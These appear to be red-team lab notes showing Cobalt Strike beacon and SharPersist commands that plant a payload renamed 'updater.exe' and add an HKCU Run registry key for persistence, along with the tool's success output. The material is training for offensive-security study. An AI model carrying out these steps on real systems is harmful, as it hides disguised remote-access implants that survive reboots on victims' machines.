
AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

```powershell
# adding registry persistence key
# before doing thios I had to create http_x64.exe
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

mv http_beacon_dc2_x64.exe notupdater.exe
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\notUpdater.exe" -a "/q /n" -k "hkcurun" -v "NotUpdater" -m add
[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

Where:

- `-k` is the registry key to modify.
- `-v` is the name of the registry key to create.

  

As before, you can test this by rebooting the VM.
```shell

  It's a common misconception that an HKLM autorun will execute the payload as SYSTEM, but this is not the case.  An HKCU autorun will only trigger when the owner of the hive logs into the machine.  An HKLM autorun will trigger when any user logs into the machine, but it will still run under the context of the user's account.
```

`Two beacons are expected to spawn in Attacker Desktop Cobalt Strike sessions, we now have the Startup Folder persistence as well as the registry AutoRun`

### Proof that both beacons are working upon signing in and out of the machine.


![[Testing both persistence methods.png]]